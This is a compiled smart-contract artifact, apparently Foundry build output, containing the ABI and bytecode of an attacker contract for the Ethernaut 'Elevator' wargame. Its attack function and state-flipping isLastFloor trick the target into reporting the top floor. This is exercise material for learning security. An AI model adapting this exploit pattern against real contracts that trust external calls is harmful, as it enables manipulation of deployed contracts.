{"abi":[{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[{"name":"_elevatorInstance","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"elevatorInstance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"isLastFloor","inputs":[{"name":"_floor","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60806040525f805460ff191690553480156017575f5ffd5b50610237806100255f395ff3fe608060405260043610610033575f3560e01c80632bc6ea06146100355780635f9a4bca1461008f578063d018db3e146100be575b005b348015610040575f5ffd5b505f5461006590610100900473ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff90911681526020015b60405180910390f35b34801561009a575f5ffd5b506100ae6100a93660046101b0565b6100dd565b6040519015158152602001610086565b3480156100c9575f5ffd5b506100336100d83660046101c7565b610101565b5f805460ff16156100f057506001919050565b50505f805460ff1916600117815590565b5f80547fffffffffffffffffffffff0000000000000000000000000000000000000000ff1661010073ffffffffffffffffffffffffffffffffffffffff8416908102919091179091556040517fed9a71340000000000000000000000000000000000000000000000000000000081526001600482015263ed9a7134906024015f604051808303815f87803b158015610197575f5ffd5b505af11580156101a9573d5f5f3e3d5ffd5b5050505050565b5f602082840312156101c0575f5ffd5b5035919050565b5f602082840312156101d7575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff811681146101fa575f5ffd5b939250505056fea2646970667358221220f9bd78650c31b02948ca40c9af4a48374df7adf6beba0c68cca94b4d38b3bb3664736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack(address)":"d018db3e","elevatorInstance()":"2bc6ea06","isLastFloor(uint256)":"5f9a4bca"},"id":0}